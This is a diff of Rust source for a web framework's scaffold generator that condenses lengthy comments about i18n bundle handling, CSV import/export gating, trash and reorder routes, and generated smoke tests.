-        // case, and skipped on the revert path (where this Create is a Delete).
+        // If this resource is a parent, its `show` carries injected children sections (#1323)
+        // that the flat template does not render. They are re-applied onto the fresh render so a
+        // `--force` regeneration does not drop them, the only record of the relationship.
         let previous_own_routes = if for_revert {
             String::new()
         } else {
             read_or_empty(&own_routes_path)
         };
-        // Issue #1349: the one seam every user-facing string in the generated
-        // views passes through. With `--i18n` off it returns each caller's
-        // literal expression verbatim, so the rendered file is byte-for-byte
-        // what it was before this feature existed; with it on, each string
-        // becomes a `t!(locale, "key")` lookup and the key/English pair is
-        // recorded for the `i18n/en.ftl` back-fill below.
+        // Every user-facing view string goes through `labels` (#1349). With `--i18n` off it
+        // returns the literal; with it on, a `t!(locale, "key")` lookup whose key and English
+        // text are recorded for the bundle back-fill below.
         let labels = scaffold_i18n::ViewLabels::new(options_with_key.i18n);
         let fresh_own_routes = render_routes_file(
             project_root,
@@ -1220,30 +1035,20 @@ fn plan_scaffold_with_options_impl(
         })?;
         plan.create(own_routes_path, own_routes);
 
-        // #1349: back-fill `i18n/en.ftl` with every key the views just referenced, and
-        // wire the three project-level bits that make those lookups resolve with no
-        // further config (AC4). Order matters for the file, not the plan: `t!` validates
-        // key existence at compile time against the default locale's bundle, so a
-        // referenced key missing from `en.ftl` is a `compile_error!` in the user's app
-        // rather than a runtime miss. `labels.used_keys()` is the exact set the render
-        // emitted — no more, which `autumn i18n check` would flag as unused, and no fewer.
+        // Back-fill the default bundle with every key the views reference and wire the project
+        // so the lookups resolve (#1349). `t!` checks keys at compile time, so a missing key is
+        // a `compile_error!`. `labels.used_keys()` is exactly the set the render emitted, so
+        // `autumn i18n check` finds nothing unused.
         let autumn_toml_path_for_i18n = project_root.join("autumn.toml");
-        // #2439: `ChangesetForm` looks up this key. It is the same key as
-        // `autumn_web::form::NUL_CHARACTER_MESSAGE_KEY`.
+        // `ChangesetForm` looks up this key: `autumn_web::form::NUL_CHARACTER_MESSAGE_KEY` (#2439).
         labels.framework_key(
             scaffold_i18n::NUL_MESSAGE_KEY,
             scaffold_i18n::NUL_MESSAGE_ENGLISH,
         );
         let referenced_keys = labels.used_keys();
         if labels.enabled() && !referenced_keys.is_empty() {
-            // Write to the bundle the app actually resolves through, not a
-            // hardcoded `i18n/en.ftl`. A project configured with
-            // `default_locale = "fr"` — or `dir = "translations"` — looks its
-            // keys up somewhere else entirely, so keys parked at the default
-            // path would render as visible `{$post.index.title}` placeholders
-            // and read as "missing from the default locale" to `autumn i18n
-            // check`, while `t!`'s compile-time validation (which looks under
-            // `i18n/` for `en`) passed and hid it until runtime.
+            // Write to the bundle the app resolves through (`default_locale`, `dir`), not a
+            // hardcoded `i18n/en.ftl`; keys elsewhere would render as raw placeholders.
             let (configured_locale, configured_dir) =
                 scaffold_i18n::configured_i18n(&read_or_empty(&autumn_toml_path_for_i18n));
             let default_locale = configured_locale.unwrap_or_else(|| "en".to_owned());
@@ -1251,10 +1056,8 @@ fn plan_scaffold_with_options_impl(
             let ftl_path = project_root
                 .join(&i18n_dir)
                 .join(format!("{default_locale}.ftl"));
-            // NOT `read_or_empty`: that maps an unreadable or non-UTF-8 file to
-            // `""`, and the merge would then write a fresh English file straight
-            // over somebody's translations. An existing bundle we cannot read is
-            // a hard error, not an empty one.
+            // Not `read_or_empty`: an unreadable bundle read as `""` would be overwritten with a
+            // fresh English file, losing its translations.
             let existing_ftl = match std::fs::read_to_string(&ftl_path) {
                 Ok(contents) => contents,
                 Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
@@ -1268,14 +1071,10 @@ fn plan_scaffold_with_options_impl(
                     )));
                 }
             };
-            // A `--force` regeneration reconciles the block against the keys
-            // the NEW render emits, which is what stops a dropped field
-            // leaving orphans behind — but a key this render no longer emits
-            // can still be called from hand-written code elsewhere, and `t!`
-            // rejects a missing key at COMPILE time. Same project scan
-            // `destroy` uses, reading the plan's PENDING contents so this
-            // resource's own freshly rendered routes are what count for it,
-            // not the superseded file still on disk.
+            // Reconciling against the new render prunes keys for dropped fields, but hand-written
+            // code may still call one, and `t!` rejects a missing key at compile time. Keep those.
+            // The scan reads the plan's pending contents, so this resource's fresh routes count,
+            // not the superseded file on disk.
             let pending = super::emit::pending_contents(&plan);
             let surviving_scan = super::emit::scan_surviving_sources(project_root, &[], &pending);
             let still_referenced =
@@ -1288,39 +1087,25 @@ fn plan_scaffold_with_options_impl(
                 &still_referenced,
             );
             if merged != existing_ftl {
-                // `create` rather than `modify` when the file is new: the plan's
-                // collision check should treat a first-time `i18n/en.ftl` like
-                // any other generated file.
+                // `create` for a new file, so the plan's collision check covers it.
                 if existing_ftl.is_empty() && !ftl_path.exists() {
                     plan.create(ftl_path.clone(), merged);
                 } else {
                     plan.modify(ftl_path.clone(), merged);
                 }
             }
-            // `t!`'s compile-time key check does not read `autumn.toml`. It
-            // resolves its own bundle from `AUTUMN_I18N_FILE`, else
-            // `$CARGO_MANIFEST_DIR/i18n/$AUTUMN_I18N_DEFAULT_LOCALE.ftl` with the
-            // locale defaulting to `en`, and degrades to a runtime lookup only
-            // when that file is absent. So a project on `default_locale = "fr"`
-            // that still keeps the validator's bundle around gets the worst case:
-            // the validator finds it, it lacks every key just written to `fr.ftl`,
-            // and `cargo check` fails with a `compile_error!` per lookup.
-            //
-            // Keep it in step: the bundle the macro would pick, resolved the way
-            // the macro resolves it, not a hardcoded `i18n/en.ftl`. Only when it
-            // already exists — an absent one means there is no compile-time check
-            // to satisfy, and writing it would invent a locale the project
-            // deliberately does not have.
+            // `t!`'s compile-time check does not read `autumn.toml`: it uses `AUTUMN_I18N_FILE`,
+            // else `$CARGO_MANIFEST_DIR/i18n/$AUTUMN_I18N_DEFAULT_LOCALE.ftl` (locale default
+            // `en`), and skips the check when that file is absent. If that bundle exists and
+            // differs from the runtime one, it needs the same keys or `cargo check` fails. An
+            // absent one is left absent.
             let mut extra_revert_paths: Vec<std::path::PathBuf> = Vec::new();
             let macro_env = scaffold_i18n::MacroEnv::resolve(project_root);
             if let Some(validator_path) =
                 scaffold_i18n::validator_bundle_path(project_root, &macro_env)
                 && validator_path != ftl_path
             {
-                // Same fallible read as the runtime bundle above, for the same
-                // reason: `read_or_empty` would turn an unreadable or non-UTF-8
-                // file into `""`, and the `Modify` below would then write a
-                // fresh English bundle straight over whatever it holds.
+                // Fallible read, as for the runtime bundle above.
                 let base = match std::fs::read_to_string(&validator_path) {
                     Ok(contents) => contents,
                     Err(e) => {
@@ -1334,13 +1119,9 @@ fn plan_scaffold_with_options_impl(
                         )));
                     }
                 };
-                // The SAME preserving merge the runtime bundle gets, against
-                // this file's own definitions. Reconciling the validator block
-                // against only the newly generated keys undoes the protection:
-                // a key held back from the runtime prune because hand-written
-                // code still calls it would be dropped from the very bundle
-                // that call is validated against, so the build fails anyway —
-                // just from the other file.
+                // The same preserving merge, against this file's own definitions: a key kept in
+                // the runtime bundle for hand-written callers must survive here too, or their
+                // compile-time check fails.
                 let still_referenced_here =
                     super::emit::keys_still_referenced_in(&surviving_scan, &base);
                 let merged = scaffold_i18n::merge_en_ftl_keeping(
@@ -1356,25 +1137,15 @@ fn plan_scaffold_with_options_impl(
                 extra_revert_paths.push(validator_path);
             }
 
-            // Destroy takes back this resource's keys only. The shared `common.*`
-            // block and the file itself always survive: sibling resources reuse
-            // the chrome, and `.i18n_auto()` panics at startup if the default
-            // locale's file is missing.
-            //
-            // Every locale bundle, not just the default. A translator starts a
-            // locale by copying the default bundle and translating in place, so
-            // `fr.ftl` carries this resource's block, and its markers, too.
-            // Reverting only the default leaves those copies behind with nothing
-            // referencing them, which `autumn i18n check --strict` fails on as
-            // unused. The revert is marker-bounded and recomputed per file, so a
-            // hand-authored key outside the block is as safe here as in the
-            // default bundle.
+            // Destroy removes only this resource's marker-bounded block. `common.*` and the file
+            // survive: siblings reuse the chrome, and `.i18n_auto()` panics if the default
+            // bundle is missing. Every locale bundle is reverted, since translators copy the
+            // default one and `autumn i18n check --strict` fails on leftover unused keys.
             let mut revert_paths: std::collections::BTreeSet<std::path::PathBuf> =
                 scaffold_i18n::locale_bundles(project_root, &i18n_dir)
                     .into_iter()
                     .collect();
-            // The default bundle even when this run is what creates it — the
-            // directory scan above only sees what is already on disk.
+            // The scan above only sees files on disk; this run may be creating the default one.
             revert_paths.insert(ftl_path.clone());
             revert_paths.extend(extra_revert_paths);
             for path in revert_paths {
@@ -1385,15 +1156,8 @@ fn plan_scaffold_with_options_impl(
                 });
             }
 
-            // A project that already ships another locale gets those keys as
-            // UNTRANSLATED until someone writes them, and `--strict` exits
-            // non-zero on that. Say so by name rather than letting the next CI
-            // run be the messenger.
-            //
-            // Deliberately NOT written for them: filling `es.ftl` with English
-            // would report as translated and ship English, which is worse than
-            // a warning — it turns a visible gap into a silent one. The bundle
-            // header this generator writes says the same thing to translators.
+            // Other locales get the new keys as untranslated, which `--strict` fails on. Warn
+            // instead of filling them with English, which would hide the gap.
             let other_locales: Vec<String> = scaffold_i18n::locale_bundles(project_root, &i18n_dir)
                 .into_iter()
                 .filter(|path| path != &ftl_path)
@@ -1412,24 +1176,11 @@ fn plan_scaffold_with_options_impl(
                 ));
             }
 
-            // (The `i18n` Cargo feature is enabled further down, alongside
-            // `maud`/`csv`/`htmx` — `plan_cargo_deps` runs between here and
-            // there and rebuilds its Cargo.toml action from DISK, so an edit
-            // made at this point would be silently dropped.)
+            // The `i18n` Cargo feature is enabled further down: `plan_cargo_deps` rebuilds its
+            // Cargo.toml action from disk, so an edit made here would be dropped.
 
-            // (#2227 closed the three gaps this block used to warn about. The
-            // Markdown editor's chrome now goes through `RichTextLabels`. The
-            // state-transition buttons go through `TransitionLabels`. The
-            // inline validation messages go through `into_changeset_with`. The
-            // one remaining gap — the CSV import report — is named where
-            // `import_enabled` is known, further down.)
-
-            // A profile overlay can repoint i18n somewhere else entirely, and
-            // the runtime resolves the fully layered config — so the base
-            // bundle this generator just wrote (and the `COPY` it is about to
-            // add) can be the wrong one for the deploy that matters. Writing
-            // English into a `fr` production bundle would be a worse answer, so
-            // name the paths and let the author decide.
+            // A profile overlay can repoint i18n, so the bundle written here may not be the one a
+            // deploy loads. Name the paths rather than write English into another bundle.
             for (profile, path) in scaffold_i18n::profile_i18n_overrides(
                 &read_or_empty(&autumn_toml_path_for_i18n),
                 &i18n_dir,
@@ -1444,11 +1195,8 @@ fn plan_scaffold_with_options_impl(
                 ));
             }
 
-            // The same hazard through the OTHER spelling. A standalone
-            // `autumn-<profile>.toml` is merged LAST — after `autumn.toml` and
-            // its inline `[profile.…]` sections — so a project that keeps its
-            // production config in one has no `[profile.prod.i18n]` for the scan
-            // above to find, and the loudest case reports nothing at all.
+            // The same for a standalone `autumn-<profile>.toml`, which is merged last and has
+            // no `[profile.*.i18n]` section for the scan above to find.
             let profile_files: Vec<(String, String)> = std::fs::read_dir(project_root)
                 .into_iter()
                 .flatten()
@@ -1475,17 +1223,13 @@ fn plan_scaffold_with_options_impl(
                 ));
             }
 
-            // The image has to carry the bundle: `.i18n_auto()` panics at
-            // startup when the default locale's file is missing, and the plain
-            // `autumn new` Dockerfile copies no `i18n/` directory.
+            // `.i18n_auto()` panics when the default bundle is missing, and the `autumn new`
+            // Dockerfile copies no `i18n/` directory.
             let dockerfile_path = project_root.join("Dockerfile");
             if dockerfile_path.exists() {
                 let base = read_or_empty(&dockerfile_path);
-                // A `dir` that moved since an earlier `--i18n` run leaves the old
-                // pair behind, and the new pair is added beside it. `COPY` fails
-                // the build outright when its source is gone from the context, so
-                // the stale line is the difference between an image that builds
-                // and one that does not.
+                // A moved `dir` leaves the old `COPY` lines behind, and `COPY` fails the build
+                // once its source is gone.
                 if let Some(stale) = scaffold_i18n::stale_dockerfile_i18n_dir(&base, &i18n_dir) {
                     plan.warn(format!(
                         "Dockerfile still copies `{stale}/` — the locale directory an earlier \
@@ -1510,10 +1254,7 @@ fn plan_scaffold_with_options_impl(
                 }
             }
 
-            // `[i18n]` in `autumn.toml` names the default locale the bundle
-            // loads. Only touched when the project actually has an
-            // `autumn.toml` to edit and does not already configure i18n — a
-            // project on a non-`en` default must keep it.
+            // Add `[i18n]` only when `autumn.toml` exists and does not configure i18n already.
             let autumn_toml_path = autumn_toml_path_for_i18n;
             if autumn_toml_path.exists() {
                 let base = plan
@@ -1528,15 +1269,8 @@ fn plan_scaffold_with_options_impl(
                     })
                     .map_or_else(
                         || {
-                            // Read FALLIBLY. `read_or_empty` turns an unreadable
-                            // file — non-UTF-8, or unreadable under the current
-                            // ACL — into `""`, and the `Modify` planned below
-                            // would then write a fresh `[i18n]` block over
-                            // whatever was really there, destroying the project's
-                            // configuration. The bundle reads above already take
-                            // this care; this one is the same hazard with a worse
-                            // blast radius, since `autumn.toml` configures
-                            // everything. Absence stays absent.
+                            // Fallible read: `read_or_empty` would let the `Modify` below
+                            // overwrite an unreadable `autumn.toml`.
                             match std::fs::read_to_string(&autumn_toml_path) {
                                 Ok(src) => Ok(src),
                                 Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
@@ -1565,11 +1299,9 @@ fn plan_scaffold_with_options_impl(
             name: plural.clone(),
         });
 
-        // Issue #1323 AC4: the PARENT resource's generated `show` view gains a
-        // list of its children plus an inline create form. That is an in-place
-        // edit to a file this invocation does not own, so it is marker-delimited
-        // (idempotent on re-run) and paired with a `Revert` so `autumn destroy`
-        // takes exactly those lines back out (#1048).
+        // The parent's `show` view gains a children list and inline create form (#1323). The
+        // edit is marker-delimited, so it is idempotent and `autumn destroy` can take it back
+        // out (#1048).
         if let Some(n) = nesting.as_ref()
             && !for_revert
         {
@@ -1581,12 +1313,8 @@ fn plan_scaffold_with_options_impl(
                 );
             }
         }
-        // The destroy-side counterpart, driven by the MARKERS on disk rather
-        // than by `--belongs-to` being repeated on the destroy command line:
-        // the flag is something the author typed once, days ago, and forgetting
-        // it must not leave a `crate::routes::{plural}::children_section(…)`
-        // call dangling in a parent whose child module this destroy just
-        // deleted — an uncompilable project.
+        // Destroy-side cleanup keys off the markers on disk, not a repeated `--belongs-to`, so
+        // no `children_section(…)` call is left dangling in the parent.
         for parent_routes in &nested_parents {
             plan.push_revert(Revert::NestedChildSection {
                 path: parent_routes.clone(),
@@ -1595,11 +1323,8 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // Record-level authorization policy + scope (issue #1125). Emitted for every
-    // non-`--api` scaffold unless `--no-policy` is passed. The main.rs
-    // registration is folded into the shared `updated` content below (a second
-    // `Modify` on main.rs would clobber the route wiring, since each is computed
-    // against on-disk content).
+    // The main.rs registration is folded into the shared `updated` content below: a second
+    // `Modify` on main.rs, computed from disk, would clobber the route wiring.
     if policy_on {
         super::policy::push_policy_files(
             &mut plan,
@@ -1608,33 +1333,23 @@ fn plan_scaffold_with_options_impl(
             &snake_name,
             &plural,
             owner_column.as_ref(),
-            // Scaffold always writes the per-resource `src/models/<snake>.rs`
-            // layout, so the model type is always `crate::models::<snake>::<Pascal>`.
+            // Scaffold always writes the per-resource `src/models/<snake>.rs` layout.
             &format!("crate::models::{snake_name}::{pascal_name}"),
         );
     }
 
-    // Issue #1312: bulk-select + `POST /{plural}/bulk_delete`. Must agree exactly
-    // with the `bulk_delete_enabled` gate in `render_routes_file` (plus `--api`,
-    // which emits no HTML routes module at all), or main.rs would mount a route
-    // the module never emitted.
+    // Each `*_enabled` gate below must match its gate in `render_routes_file` (plus `--api`,
+    // which emits no routes module), or main.rs would mount a route the module never emitted.
+    //
+    // Bulk select and `POST /{plural}/bulk_delete` (#1312).
     let bulk_delete_enabled = !options_with_key.api
         && !options_with_key.live
         && !options_with_key.live_validation
         && !options_with_key.model.sharded;
-    // #1315: the `CsvSchema` impl and `GET /{plural}/export.csv` download. It must agree
-    // exactly with the `export_enabled` gate in `render_routes_file`, plus `--api`, which
-    // emits no HTML routes module at all, or main.rs would mount a route the module never
-    // emitted.
-    //
-    // Spelled out operand by operand rather than reusing `authorize_wiring`, which is the
-    // same predicate today but is documented as the signal for the cross-user 403 smoke
-    // test: narrowing it for that reason would silently desync the two copies of this
-    // gate. `owner_authorizes` is `render_routes_file`'s `owner_scoped_index`, and the
-    // first disjunct is its `owner_scoped_standard`. Bound as two named locals rather
-    // than one expression, so the disjunction reads as the two index branches it mirrors;
-    // clippy's `nonminimal_bool` would otherwise demand the algebraically-minimal form,
-    // which loses that.
+    // `CsvSchema` impl and `GET /{plural}/export.csv` (#1315). Spelled out rather than reusing
+    // `authorize_wiring`, which serves the smoke test and may change for it. The two locals
+    // mirror `render_routes_file`'s two index branches (`owner_scoped_index` is
+    // `owner_authorizes`); one expression would trip clippy's `nonminimal_bool`.
     let owner_scoped_standard_export = owner_authorizes
         && !options_with_key.model.sharded
         && !options_with_key.live
@@ -1642,32 +1357,18 @@ fn plan_scaffold_with_options_impl(
     let plain_export =
         !owner_authorizes && !options_with_key.live && !options_with_key.model.sharded;
     let export_enabled = !options_with_key.api && (owner_scoped_standard_export || plain_export);
-    // #1393: the CSV import surface (`GET`/`POST /{plural}/import`). It must agree
-    // exactly with the `import_enabled` gate in `render_routes_file`, or main.rs would
-    // mount routes the module never emitted. Gated on `export_enabled` rather than a
-    // matrix of its own: the import decodes each row against the `CsvSchema` impl the
-    // export emits, so where there is no export there is no column map to import against.
+    // CSV import, `GET`/`POST /{plural}/import` (#1393). It decodes rows against the export's
+    // `CsvSchema`, so it needs `export_enabled`.
     //
-    // An at-rest `#[encrypted]` column is omitted from the export (#1340 — the model
-    // holds plaintext, so exporting it would write every row's decrypted secret into a
-    // downloadable file), but it is a required field on `{Pascal}Form`. A file whose
-    // header is `csv_columns()` therefore cannot satisfy the form: every row would fail to
-    // decode with "missing field", and the upload page would hand the operator the exact
-    // header guaranteed to fail. Refuse the surface instead. Derived from `form_fields`,
-    // the columns the form actually carries, so an encrypted column that is `--default`ed
-    // — and therefore absent from the form too — does not block the import.
+    // An `#[encrypted]` column is left out of the export (#1340) but required by the form, so
+    // every imported row would fail to decode. Read from `form_fields`, so a `--default`ed
+    // encrypted column, which the form also lacks, does not block the import.
     let encrypted_form_column = form_fields
         .iter()
         .find(|f| f.is_encrypted())
         .map(|f| f.name.clone());
-    // An import that can set NO column is a surface with no purpose: every row it
-    // creates is a row of database defaults, and — because a form with no
-    // settable field decodes ANY row successfully — an unrelated upload would
-    // preview and commit as a run of blank records. That is the wrong-file
-    // failure the header check exists to stop, in the one shape where there is
-    // no header to check. Refuse the surface rather than emit one whose only
-    // possible output is junk. Reached for a model whose every column is an
-    // `Attachment` or `--default`ed.
+    // A form with no settable column decodes any row, so any upload would commit as blank
+    // records. Happens when every column is an `Attachment` or `--default`ed.
     let settable_import_columns = form_fields
         .iter()
         .filter(|f| !f.kind.is_attachment())
@@ -1676,17 +1377,9 @@ fn plan_scaffold_with_options_impl(
         && export_enabled
         && encrypted_form_column.is_none()
         && settable_import_columns > 0;
-    // A `--import` that lands on a gated-off variant would otherwise be silent:
-    // no upload form, no route, no explanation. Say so at generation time with
-    // the reason and the way out, exactly as `--soft-delete` does for a missing
-    // Trash view. Only reached when the flag was actually passed, so an ordinary
-    // scaffold prints nothing.
+    // Explain a gated-off `--import` rather than silently emitting no route.
     if options_with_key.import && !import_enabled {
-        // One arm per way `export_enabled` can be false, in the order the gate
-        // itself evaluates them — the import decodes against the export's
-        // `CsvSchema`, so every reason is really "no schema was emitted here".
-        // Each names what to drop, because "not supported" without a way out is
-        // the warning an author has to come and read the source to act on.
+        // One arm per way the gate can be false, each naming what to drop.
         let reason =
             if export_enabled && encrypted_form_column.is_none() && settable_import_columns == 0 {
                 "no column on this model can be set from a CSV — every column is an \
@@ -1728,13 +1421,8 @@ fn plan_scaffold_with_options_impl(
              import route; see docs/guide/generators.md."
         ));
     }
-    // #2227: `create` and `update` now resolve each validator error code through
-    // the bundle. A rejected form shows a translated message under a translated
-    // label. The CSV import report shows the same messages but cannot translate
-    // them: `import_csv` calls its row handler once per line, far from the
-    // request, so there is no locale to look the message up in. The report an
-    // operator reads after an upload keeps `validation failed: <code>` in
-    // English.
+    // `create` and `update` translate validator messages (#2227), but the CSV import report
+    // cannot: its row handler runs per line with no request locale.
     if options_with_key.i18n && import_enabled && metadata.has_validator_rules() {
         plan.warn(
             "`--i18n` translates the inline `#[validate(...)]` messages on the create and \
@@ -1744,40 +1432,23 @@ fn plan_scaffold_with_options_impl(
                 .to_owned(),
         );
     }
-    // Issue #1332: the trash view + restore/purge controls. Must agree exactly
-    // with the `trash_enabled` gate in `render_routes_file` (plus `--api`, which
-    // emits no HTML routes module at all), or main.rs would mount routes the
-    // module never emitted. `owner_authorizes` is `render_routes_file`'s
-    // `owner_scoped_index`.
+    // Trash view with restore/purge controls (#1332).
     let trash_enabled = options_with_key.model.soft_delete
         && !options_with_key.api
         && !options_with_key.live
         && !options_with_key.live_validation
         && !options_with_key.model.sharded
         && !owner_authorizes;
-    // #1358: the position field's no-JS Move up / Move down index buttons and their
-    // `POST /{plural}/{id}/move_up`|`move_down` handlers. Must agree exactly with the
-    // `reorder_enabled` gate in `render_routes_file`, plus `--api`, which emits no HTML
-    // routes module at all, or main.rs would mount routes the module never emitted. Same
-    // restriction set as `trash_enabled`, scoped to the plain HTML index for this slice:
-    // `--api`, `--live`, `--live-validation`, and owner-scoped scaffolds still get the
-    // repository's `move_*` methods, and for `--api` the ordered data, just not the HTML
-    // buttons. `--sharded` is different: the repository attribute omits `position(...)`
-    // entirely there, because the macro rejects `position(...)` combined with `sharded` —
-    // a move only reaches the pool or shard it happens to be given.
+    // Move up / Move down buttons and `POST /{plural}/{id}/move_up`|`move_down` (#1358), on
+    // the plain HTML index only. Other variants still get the repository's `move_*` methods.
     let reorder_enabled = fields.iter().any(|f| f.kind.is_position())
         && !options_with_key.api
         && !options_with_key.live
         && !options_with_key.live_validation
         && !options_with_key.model.sharded
         && !owner_authorizes;
-    // A `--soft-delete` scaffold that lands on one of the gated-off variants
-    // gets the data layer and the delete tunnel but NO way to see or recover
-    // what it deleted — exactly the situation #1332 exists to remove. Say so at
-    // generation time, with the reason and the way out, rather than leaving the
-    // author to notice the missing Trash link and go read the guide. Only
-    // reached when the flag was actually passed, so an ordinary scaffold prints
-    // nothing.
+    // Explain a gated-off Trash view: without it, soft-deleted rows cannot be seen or
+    // recovered (#1332).
     if options_with_key.model.soft_delete && !trash_enabled {
         let reason = if options_with_key.api {
             "an --api scaffold renders no HTML views"
@@ -1798,19 +1469,9 @@ fn plan_scaffold_with_options_impl(
              trash route can use them; see docs/guide/generators.md."
         ));
     }
-    // #1358: `position(...)` on `#[repository(..., sharded)]` is rejected outright by the
-    // macro (see `autumn-macros`' `parse_repo_args`), because a move only reaches the pool
-    // or shard it happens to be given. So `render_repository_file` was made to omit
-    // `position(...)` from a sharded scaffold's attribute entirely, generating the column
-    // and its migration triggers — insert-assign, delete-compact — with no `move_*`
-    // methods and only a warning. That left a live gap: `delete_many`'s
-    // single-row-chunking fix for the batch-compaction race (`autumn-macros`'
-    // `delete_chunk_size`) keys off `config.position`, which the sharded attribute no
-    // longer carries, so a sharded model's bulk delete keeps its 1000-row chunks even
-    // though the row-level compaction triggers are still installed and still vulnerable to
-    // the same multi-row-per-statement race. Reject the combination outright instead:
-    // partial position support — column and triggers, but no working reorder and no safe
-    // bulk delete — is not worth the silent corruption risk.
+    // The macro rejects `position(...)` with `sharded` (#1358), and without it `delete_many`
+    // keeps its multi-row chunks (`delete_chunk_size` keys off `config.position`), which races
+    // the migration's row-level compaction triggers. Refuse the combination.
     if fields.iter().any(|f| f.kind.is_position()) && options_with_key.model.sharded {
         return Err(GenerateError::Config(format!(
             "position field on --sharded {plural}: not supported. \
@@ -1821,9 +1482,7 @@ fn plan_scaffold_with_options_impl(
              to know it must not. Drop the position field, or drop --sharded."
         )));
     }
-    // Smoke test under `tests/<snake>.rs`. Uses the same soft-delete-augmented
-    // field list as the real migration (see `augment_fields_for_soft_delete`)
-    // so the smoke test's throwaway table matches the real schema exactly.
+    // Same soft-delete-augmented fields as the migration, so the throwaway table matches it.
     let smoke_test_fields =
         augment_fields_for_soft_delete(&fields, options_with_key.model.soft_delete)?;
     let mut smoke_test = render_smoke_test(
@@ -1839,37 +1498,19 @@ fn plan_scaffold_with_options_impl(
         authorize_wiring,
         bulk_delete_enabled,
     );
-    // #1315 (AC6): the CSV download test — status, media type, attachment disposition,
-    // header row, RFC 4180 quoting, and the empty cell a NULL column serializes to. It
-    // needs no database, since its rows are in-process, so unlike the index read test it
-    // is not `#[ignore]`d. Appended here rather than inside `render_smoke_test` because it
-    // is the one generated test built from `fields`, the model's declared columns matching
-    // the emitted `CsvSchema`, instead of `smoke_test_fields`, that list plus
-    // soft-delete's `deleted_at`, which the throwaway `CREATE TABLE` needs. Both are
-    // `&[Field]`, so passing them side by side into a ten-argument function would be a
-    // silent mix-up the compiler could not catch.
+    // CSV export test (#1315). Built from `fields`, which match the `CsvSchema`, not
+    // `smoke_test_fields`, which add `deleted_at`. It is kept out of `render_smoke_test` so
+    // the two `&[Field]` lists cannot be swapped silently.
     if export_enabled {
         smoke_test.push_str(&render_csv_export_smoke_test(&plural, &fields));
     }
-    // Issue #1393 (AC6): the import test — a 2-row upload (1 valid, 1 invalid)
-    // previewed, then committed. Appended here for the same reason as the export
-    // test above: it is built from the resource's ROUTES rather than from the
-    // column list `render_smoke_test` is shaped around, and it is emitted under
-    // exactly the gate that decides whether those routes exist at all.
+    // The route-based tests below are emitted under the same gates as their routes.
     if import_enabled {
         smoke_test.push_str(&render_csv_import_smoke_test(&plural));
     }
-    // Issue #1332 (AC7): the trash lifecycle test — create, soft delete, recover,
-    // purge. Appended here, alongside the CSV test, for the same reason: it is
-    // built from the resource's ROUTES rather than from the column list
-    // `render_smoke_test` is shaped around, and it is emitted under exactly the
-    // gate that decides whether those routes exist at all.
     if trash_enabled {
         smoke_test.push_str(&render_trash_lifecycle_smoke_test(&pascal_name, &plural));
     }
-    // Issue #1323 AC7: the nested write-path test. Appended here, alongside the
-    // CSV test, because `render_smoke_test` is shaped around the resource's own
-    // flat surface and this one needs the resolved parent binding.
     if let Some(n) = nesting.as_ref() {
         smoke_test.push_str(&render_nested_write_path_smoke_test(
             &pascal_name,
@@ -1882,7 +1523,6 @@ fn plan_scaffold_with_options_impl(
         smoke_test,
     );
 
-    // `src/main.rs` updates: declare modules + register all new routes.
     let main_path = project_root.join("src").join("main.rs");
     let main_existing = std::fs::read_to_string(&main_path).map_err(|_| {
         GenerateError::Io(std::io::Error::new(
@@ -1890,12 +1530,8 @@ fn plan_scaffold_with_options_impl(
             format!("missing {}", main_path.display()),
         ))
     })?;
-    // Issue #1255: a `richtext` column never takes the htmx inline-validation
-    // path — its wrapper already owns an `hx-post` for the live preview, so
-    // `render_changeset_form_inputs` renders the editor instead of
-    // `text_input_htmx`. Emitting (and mounting, and submit-token-exempting) a
-    // `validate_{field}` route nothing links to would be dead surface, so filter
-    // those columns out here and at the emission site in `render_routes_file`.
+    // A `richtext` column renders the editor, whose wrapper owns an `hx-post` for the preview,
+    // so it has no htmx inline validation (#1255). `render_routes_file` filters it out too.
     let validated_field_names: Vec<String> = if options_with_key.live_validation {
         metadata
             .validations()
@@ -1911,14 +1547,12 @@ fn plan_scaffold_with_options_impl(
     } else {
         Vec::new()
     };
-    // Issue #1319: the search box/route exist only for the standard (non-live)
-    // HTML index; the model/repository/migration get `searchable` regardless.
+    // The search box and route exist only on the non-live HTML index (#1319); the model,
+    // repository and migration get `searchable` regardless.
     let search_enabled = !options_with_key.model.searchable.is_empty()
         && !options_with_key.live
         && !options_with_key.live_validation;
-    // Issue #1326: the state-machine fields whose `transition_{field}` handler
-    // the generated `routes::{plural}` module emits and `main.rs` must mount.
-    // Only the HTML surface emits these handlers, so this stays empty for `--api`.
+    // State-machine fields whose `transition_{field}` handler main.rs mounts (#1326).
     let sm_field_names: Vec<String> = if options_with_key.api {
         Vec::new()
     } else {
@@ -1928,14 +1562,8 @@ fn plan_scaffold_with_options_impl(
             .map(|f| f.name.clone())
             .collect()
     };
-    // Issue #1255: the `POST /{plural}/preview/{field}` fragment handlers the
-    // routes module emits for each `richtext` column. HTML surface only — an
-    // `--api` scaffold renders no form, so it emits no preview endpoint.
-    //
-    // Derived from `form_fields`, NOT `fields`: a `--default`ed column is
-    // dropped from the form (and therefore from the rendered routes module), so
-    // deriving from `fields` would mount a `preview_{field}` handler the module
-    // never emitted and fail the generated app to compile.
+    // `POST /{plural}/preview/{field}` handlers for each `richtext` column (#1255). From
+    // `form_fields`: a `--default`ed column is not in the form, so it has no handler.
     let rich_text_field_names: Vec<String> = if options_with_key.api {
         Vec::new()
     } else {
@@ -1952,42 +1580,18 @@ fn plan_scaffold_with_options_impl(
         search_enabled && !options_with_key.api,
         bulk_delete_enabled,
         export_enabled,
-        // Same double-gate reasoning as `trash_enabled || for_revert` below: a
-        // DESTROY run may not repeat `--import`, but main.rs still mounts the two
-        // handlers this resource emitted, and a revert that removed the routes
-        // module while leaving those entries behind would leave the project
-        // uncompilable. Removing an entry that is not there is a no-op.
+        // On revert, claim these entries even if the flag was not repeated: main.rs still
+        // mounts them, and leaving them after the routes module is gone breaks the build.
+        // Removing an absent entry is a no-op. On generate the gate alone decides.
         import_enabled || for_revert,
-        // Same shape as the `nested` predicate below, for the same reason: on the destroy
-        // path `--soft-delete` may not have been repeated on the command line, so
-        // `trash_enabled` is false — but `main.rs` still mounts the three trash handlers
-        // this resource emitted, and a revert that deleted the routes module while leaving
-        // them behind would leave the project uncompilable. Removing an entry that is not
-        // there is a no-op, since `remove_routes_entries` filters to the ones present, so
-        // claiming them unconditionally on the revert path is safe even for a resource
-        // that never had a trash surface. The generate path keeps the strict gate: what
